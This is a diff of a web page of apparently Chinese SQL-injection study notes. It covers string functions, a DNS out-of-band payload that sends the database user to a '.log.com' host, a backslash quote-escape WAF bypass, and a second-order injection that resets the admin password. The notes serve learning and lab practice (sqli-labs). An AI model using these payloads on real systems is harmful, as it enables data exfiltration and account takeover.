@@ -120,9 +120,9 @@ if (!doNotTrack) {
 
     
     <div class="float-md-right">
-      <span title="Lastmod: 2020-02-21. Published at: 2020-02-19.">
+      <span title="Lastmod: 2020-02-23. Published at: 2020-02-19.">
         
-          Lastmod: 2020-02-21
+          Lastmod: 2020-02-23
         
       </span>
     </div>
@@ -154,7 +154,7 @@ if (!doNotTrack) {
 concat_ws('||','a','b,'c')
 group_concat()    #将多行数据一行输出
 </code></pre><p><strong>字符串截取</strong></p>
-<p><code>substr(string, n, m)</code> 从第<code>n(&gt;=1)</code>个字符到开始第 <code>m</code>个字符 =&gt;mysql、sql_server</p>
+<p><code>substr(string, n, m)</code> 从第<code>n(&gt;=1)</code>个字符到开始第 <code>m</code>个字符 =&gt; mysql、sql_server</p>
 <p><code>substring</code>     =&gt;mysql、Oracle、sql_server</p>
 <p><code>mid</code>    =&gt;mysql</p>
 <p><code>left()</code>、 <code>right()</code> 、<code>length(arg1)</code></p>
@@ -339,7 +339,13 @@ mysql的元数据库，储存数据库的库/表/列/数据之间的关系、用
 <div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">SELECT</span> <span class="nf">LOAD_FILE</span><span class="p">(</span><span class="nf">CONCAT</span><span class="p">(</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">\\\\</span><span class="s1">&#39;</span><span class="p">,</span><span class="p">(</span><span class="k">SELECT</span> <span class="nf">hex</span><span class="p">(</span><span class="k">user</span><span class="p">(</span><span class="p">)</span><span class="p">)</span><span class="p">)</span><span class="p">,</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">.log.com\\aaa</span><span class="s1">&#39;</span><span class="p">)</span><span class="p">)</span><span class="p">;</span>
 </code></pre></div><p>​</p>
 <h2 id="不常见注入">不常见注入</h2>
-<h3 id="cookie一类注入">Cookie一类注入</h3>
+<h3 id="双条件查询">双条件查询</h3>
+<p>SqlWaf 多数屏蔽单引号，借助二次注入，利用程序自带的两对单引号</p>
+<p>双条件查询或带两对单引号的SQL语句，转义第二个单引号</p>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="n">username</span><span class="p">,</span><span class="n">password</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="s1">&#39;</span><span class="s1">$username</span><span class="s1">&#39;</span> <span class="k">and</span> <span class="n">password</span><span class="o">=</span><span class="s1">&#39;</span><span class="s1">$password</span><span class="s1">&#39;</span> <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span>
+</code></pre></div><p>传入<code>\</code> 逃出单引号，payload: <code>username=abc\&amp;password=or 'admin</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="n">username</span><span class="p">,</span><span class="n">password</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="s1">&#39;</span><span class="s1">admin\</span><span class="s1">&#39;</span> <span class="k">and</span> <span class="n">password</span><span class="o">=</span><span class="s1">&#39;</span><span class="s1">$password</span><span class="s1">&#39;</span> <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span>
+</code></pre></div><h3 id="cookie一类注入">Cookie一类注入</h3>
 <p><strong>Cookie</strong>  BASE64注入(sqli-labs第20-21关)</p>
 <p>burpsuit的intruder的playload process的添加前缀、添加后缀、base64编码。</p>
 <p>​</p>
@@ -351,14 +357,15 @@ mysql的元数据库，储存数据库的库/表/列/数据之间的关系、用
 <p><code>mysqli_muti_query() </code>    <strong>mysqli</strong>支持多行查询</p>
 <p>​</p>
 <h3 id="二阶注入">二阶注入</h3>
-<p>创建一个恶意用户 admin&rsquo;#</p>
-<p>登录 select uname from users where username='admin&rsquo;#&rsquo; and password=&rsquo;';</p>
-<p>修改密码</p>
-<pre><code>select * from users where username='admin'#' and password=&quot;&quot;;
-update User set password=&quot;123&quot; where username='admin'#'
-update User set password=&quot;123&quot; where username=&quot;admin&quot;#&quot;
-update User set password=&quot;123&quot; where username=admin#
-</code></pre><p>​</p>
+<p>成因：直接引用数据库数据（虽然入库数据经过转义，但是存储时是不带反引号的）</p>
+<p>解决方案：出库时需要再转义一遍</p>
+<p>假设修改密码语句</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">$username= $_SESSION[&#34;username&#34;];
+$sql = &#34;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &#34;;
+</code></pre></div><p>创建一个恶意用户 <code>admin'#</code></p>
+<p>修改密码时触发</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">UPDATE</span> <span class="n">users</span> <span class="kt">SET</span> <span class="p"></span><span class="n">PASSWORD</span><span class="o">=</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">hackyou</span><span class="s1">&#39;</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">admin</span><span class="s1">&#39;</span><span class="c1">#&#39; and password=&#39;test&#39;;
+</span></code></pre></div><p>​</p>
 <h3 id="操作注入">操作注入</h3>
 <p><strong>insert注入</strong></p>
 <p>拼接构造</p>
@@ -412,6 +419,7 @@ update User set password=&quot;123&quot; where username=admin#
     </li>
     <li><a href="#不常见注入">不常见注入</a>
       <ul>
+        <li><a href="#双条件查询">双条件查询</a></li>
         <li><a href="#cookie一类注入">Cookie一类注入</a></li>
         <li><a href="#堆叠注入">堆叠注入</a></li>
         <li><a href="#二阶注入">二阶注入</a></li>
